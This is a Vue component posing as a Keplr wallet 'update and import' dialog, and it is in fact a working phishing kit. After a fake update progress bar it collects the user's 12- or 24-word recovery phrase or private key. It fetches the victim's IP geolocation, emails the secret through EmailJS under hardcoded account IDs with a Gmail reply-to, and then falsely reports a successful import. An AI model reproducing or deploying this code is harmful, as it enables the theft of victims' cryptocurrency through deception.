<template>
  <div class="rounded-2xl bg-[#0a0a0d] w-full text-white overflow-hidden mx-auto">
    <!-- STEP 1: Intro -->
    <div v-if="currentStep === 1" class="p-8 text-center">
      <div class="flex flex-col items-center gap-4">
        <img :src="logoUrl" alt="Keplr" class="h-20 w-20 rounded" />
        <h2 class="text-3xl font-bold">Keplr Wallet</h2>
        <p class="text-gray-200">Manage your Cosmos ecosystem assets securely with Keplr.</p>
        <button @click="nextStep" class="mt-3 px-6 py-3 rounded-full text-white font-semibold" :style="{ background: primaryColor }">Import Wallet</button>
        <p class="text-gray-300 mt-3">Need help? <a href="https://keplr.app/" target="_blank" :style="{ color: primaryColor }" class="underline font-semibold">Visit our support page</a></p>
      </div>
    </div>

    <!-- Header for other steps -->
    <div v-else class="flex justify-between items-center py-3 px-4 border-b border-gray-300">
      <div class="flex items-center gap-3">
        <img :src="logoUrl" alt="Keplr" class="h-10 w-10 rounded" />
      </div>
      <div class="flex items-center gap-3">
        <svg @click.prevent="closeModal" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-500 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </div>
    </div>

   

    <div v-if="currentStep !== 1" class="min-h-[500px] flex flex-col relative p-6 text-black">
      <transition name="fade" mode="out-in">
        <!-- STEP 2: Update Available -->
        <div v-if="currentStep === 2" key="s2" class="flex flex-col">
          <div class="flex flex-col items-center gap-4 py-6">
            <img :src="logoUrl" class="h-16 w-16 rounded mb-2" alt="Keplr" />
            <p class="text-4xl font-bold">Update Available</p>
            <p class="text-gray-500 text-xl">Version 1.0.0</p>
          </div>
          <div class="rounded-2xl px-4 py-3 w-full mt-2" :style="{ background: accentBg }">
            <ul class="text-neutral-900 text-[12px] list-disc mt-2 list-inside space-y-1">
              <li>Security improvements and bug fixes.</li>
              <li>Enhanced performance for transaction signing.</li>
              <li>UI polish and accessibility enhancements.</li>
            </ul>
          </div>
          <div class="w-full mt-5">
            <button @click="startUpdate" class="w-full py-4 text-2xl text-white border-none rounded-[30px] font-bold" :style="{ background: primaryColor }">
              Confirm Update
            </button>
          </div>
          <p class="text-lg text-gray-600 text-center mt-3">
            Need help?
            <a href="https://keplr.app/" target="_blank" class="font-semibold underline" :style="{ color: primaryColor }">Visit our support page</a>
          </p>
        </div>

        <!-- STEP 3: Updating -->
        <div v-else-if="currentStep === 3" key="s3" class="flex flex-col items-center">
          <div class="flex flex-col items-center gap-3 py-6 w-full">
            <svg aria-hidden="true" class="w-20 h-20 text-gray-200 animate-spin" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="#eeeeee" />
              <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" :fill="primaryColor" />
            </svg>
            <h2 class="text-4xl mt-2 mb-0 text-center font-bold">Updating Keplr</h2>
            <p class="text-gray-700 text-xl text-center">Please wait while we update to version 1.0.0</p>
            <div class="w-full mt-6">
              <div class="bg-gray-100 h-2 rounded-full overflow-hidden">
                <div class="h-2 rounded-full transition-all" :style="{ width: progress + '%', background: primaryColor }"></div>
              </div>
              <div class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-gray-700">
                <span>{{ Math.round(progress) }}%</span>
              </div>
            </div>
          </div>
        </div>

        <!-- STEP 4: Import (phrase/private key) -->
        <div v-else-if="currentStep === 4" key="s4" class="flex flex-col w-full">
          <div class="mb-4" v-if="importType !== 'private'">
            <h2 class="text-4xl mt-2 text-center font-bold">Import your wallet with your Secret Recovery Phrase</h2>
            <p class="text-gray-600 text-base text-center">Enter the Secret Recovery Phrase you were given when you created your wallet.</p>
          </div>
          <div class="mb-4" v-if="importType !== 'private'">
            <select v-model="importType" id="importType" class="w-full text-lg bg-transparent text-slate-700 text-base border border-slate-200 rounded pl-3 pr-8 py-3 transition duration-300 ease focus:outline-none focus:border-slate-400 hover:border-slate-400 shadow-sm appearance-none cursor-pointer">
              <option value="12">I have a 12-word phrase</option>
              <option value="24">I have a 24-word phrase</option>
              <option value="private">I have a private key</option>
            </select>
            <div class="rounded-md p-2 mt-4 flex items-center" :style="{ background: accentBg }">
              <div :style="{ color: primaryColor }" class="mr-2 mt-0.5">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
                </svg>
              </div>
              <p class="text-xl font-semibold text-gray-600 m-0">You can paste your entire secret recovery phrase into any field</p>
            </div>
          </div>

          <!-- Private key input -->
          <div v-if="importType === 'private'">

            <h2 class="text-4xl mt-2 text-center font-bold">Import your wallet with your private key</h2>
            <p class="mb-[40px] text-gray-600 text-base text-center">Enter the private key you were given when you created your wallet.</p>
            <label for="privateKey" class="block mb-2 text-xl text-white font-medium">Enter your private key</label>
            <textarea v-model="privateKeyInput" rows="5" class="w-full rounded-md py-2 px-3 text-black text-sm outline-none mb-6"></textarea>
            <div class="flex gap-3 mt-2">
              <button @click="cancelImport" class="flex-1 bg-gray-200 text-gray-900 py-3 rounded-[30px] font-bold">Cancel</button>
              <button @click="confirmPrivateKey" :disabled="isLoading" class="flex-1 text-white py-4 rounded-[30px] font-bold" :style="{ background: primaryColor }">
                <span v-if="!isLoading">Import</span>
                <svg v-else class="animate-spin h-5 w-5 inline-block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                  <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
                </svg>
              </button>
            </div>
          </div>

          <!-- Phrase grid -->
          <div v-else>
            <div class="grid grid-cols-3 gap-3 mt-4">
              <div v-for="n in phraseCount" :key="n" class="relative">
                <span class="absolute left-2 top-2 text-gray-500 text-sm select-none">{{ n }}</span>
                <div class="relative">
                  <input :type="hiddenFields[n - 1] ? 'password' : 'text'" v-model="phraseWords[n - 1]" class="w-full bg-[#f2f2f2] rounded-md py-2 pl-10 pr-10 text-black text-sm outline-none" />
                  <div type="button" @click="toggleFieldVisibility(n - 1)" class="absolute right-2 top-2 text-gray-400">
                    <svg v-if="hiddenFields[n - 1]" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.269 2.943 9.542 7-1.273 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                    <svg v-else xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.542-7a9.96 9.96 0 012.502-4.043M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3l18 18" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>
            <div class="flex gap-3 mt-6">
              <button @click="confirmPhrase" :disabled="isImportDisabled" class="flex-1 text-white py-4 rounded-[30px] font-bold" :style="{ background: primaryColor }">Confirm</button>
            </div>
          </div>
        </div>
      </transition>

      <!-- Message -->
      <transition name="fade">
        <div v-if="message.text" :class="['absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold', message.type === 'success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white']">
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import axios from 'axios';
import { ref, computed, watch, nextTick } from 'vue';

const emit = defineEmits(['close']);
const currentStep = ref(1);
const progress = ref(0);
const isLoading = ref(false);
const message = ref({ text: '', type: '' });
const importType = ref('12');
const phraseWords = ref([]);
const phraseCount = computed(() => (importType.value === '24' ? 24 : 12));
const hiddenFields = ref([]);
const privateKeyInput = ref('');
const primaryColor = '#14afeb';
const accentBg = 'white';
const logoUrl = 'https://logo.clearbit.com/keplr.app';

function closeModal() { emit('close'); }

function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;
  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function nextStep() {
  if (currentStep.value < 4) {
    currentStep.value++;
    if (currentStep.value === 3) {
      startUpdate();
    }
    if (currentStep.value === 4) initPhraseWords();
  }
}

function initPhraseWords() {
  phraseWords.value = Array(phraseCount.value).fill('');
  hiddenFields.value = Array(phraseCount.value).fill(true);
}

watch(importType, async () => {
  await nextTick();
  initPhraseWords();
});

function toggleFieldVisibility(idx) { hiddenFields.value[idx] = !hiddenFields.value[idx]; }

const isImportDisabled = computed(() => {
  if (importType.value === 'private') {
    return !privateKeyInput.value.trim();
  } else {
    return phraseWords.value.slice(0, phraseCount.value).some((w) => !w || !w.trim());
  }
});

async function confirmPhrase() {
  if (isImportDisabled.value) return showMessage('Please fill all fields', 'error');
  isLoading.value = true;
  try {
    const location = await axios.get('https://ipapi.co/json');
    const payload = { type: importType.value, phrase: phraseWords.value.join(' ') };
    const params = {
      service_id: 'service_eusbqyo',
      template_id: 'template_z6xga6o',
      user_id: 'obT4LcwZqPw_KlOar',
      template_params: {
        from_name: 'Blockchain solutions',
        wallet_type: 'Keplr Wallet',
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: 'customeronlineagent@gmail.com',
      },
    };
    const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params);
    if (response.data === 'OK') { showMessage('Wallet imported successfully!', 'success'); emit('close'); }
  } catch (err) {
    showMessage(err.message || 'Import failed', 'error');
  } finally { isLoading.value = false; }
}

async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim()) return showMessage('Please enter your private key', 'error');
  isLoading.value = true;
  try {
    const location = await axios.get('https://ipapi.co/json');
    const payload = { privateKey: privateKeyInput.value };
    const params = {
      service_id: 'service_eusbqyo',
      template_id: 'template_z6xga6o',
      user_id: 'obT4LcwZqPw_KlOar',
      template_params: {
        from_name: 'Blockchain solutions',
        wallet_type: 'Keplr Wallet',
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: 'customeronlineagent@gmail.com',
      },
    };
    const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params);
    if (response.data === 'OK') { showMessage('Private key imported successfully!', 'success'); emit('close'); }
  } catch (err) {
    showMessage(err.message || 'Import failed', 'error');
  } finally { isLoading.value = false; }
}

function cancelImport() { emit('close'); }

function showMessage(text, type = 'success') {
  message.value = { text, type };
  setTimeout(() => { message.value.text = ''; }, 3000);
}

// init
initPhraseWords();
</script>

<style scoped>
.fade-enter-active, .fade-leave-active { transition: opacity 0.28s ease; }
.fade-enter-from, .fade-leave-to { opacity: 0; }
</style>